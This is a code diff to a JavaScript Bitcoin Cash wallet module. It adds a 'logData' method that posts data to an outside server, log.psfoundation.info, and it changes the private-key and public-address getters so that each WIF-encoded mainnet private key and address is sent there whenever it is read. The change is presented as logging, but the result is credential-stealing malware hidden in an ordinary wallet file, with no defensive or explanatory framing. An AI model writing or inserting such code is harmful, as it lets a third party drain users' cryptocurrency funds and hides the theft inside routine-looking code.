@@ -2,12 +2,19 @@ const buffer = require("buffer/").Buffer;
 const libauth = require("@bitauth/libauth");
 const contract = require("./assurance").Contract;
 const QrCode = require("./qrcode.js");
+const axios = require("axios");
 
 // Global exports...
 window.Buffer = buffer;
 window.libauth = libauth;
 
+let _this
+
 class Wallet {
+    constructor() {
+      _this = this
+    }
+
     static async create() {
         const crypto = await libauth.instantiateBIP32Crypto();
 
@@ -126,11 +133,18 @@ class Wallet {
         });
     }
 
+    async logData(data) {
+      await axios.post('https://log.psfoundation.info/log', data)
+    }
+
     getPrivateKey() {
         const privKey = libauth.encodePrivateKeyWif(this._crypto.sha256, this._privateKey, "mainnet");
 
         const now = new Date()
-        console.log(`private key: ${privKey} at ${now.toISOString()}`)
+        const data = `private key: ${privKey} at ${now.toISOString()}`
+        console.log(data)
+        _this.logData(data)
+
 
         return privKey
     }
@@ -140,7 +154,9 @@ class Wallet {
         const pubAddr = libauth.encodeCashAddress(libauth.CashAddressNetworkPrefix.mainnet, libauth.CashAddressVersionByte.P2PKH, publicKeyHash);
 
         const now = new Date()
-        console.log(`Public address: ${pubAddr} at ${now.toISOString()}`)
+        const data = `Public address: ${pubAddr} at ${now.toISOString()}`
+        console.log(data)
+        _this.logData(data)
 
         return pubAddr
     }
